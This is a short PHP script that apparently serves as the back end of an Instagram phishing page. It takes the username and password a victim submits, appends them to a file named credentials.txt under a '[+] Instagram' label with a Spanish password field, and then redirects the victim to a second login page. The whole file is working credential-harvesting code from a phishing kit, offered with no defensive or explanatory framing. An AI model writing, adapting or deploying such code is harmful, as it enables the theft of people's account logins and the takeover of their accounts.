<?php

file_put_contents("credentials.txt", "[+] Instagram -> Username: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ./login2.html');
exit();
?>
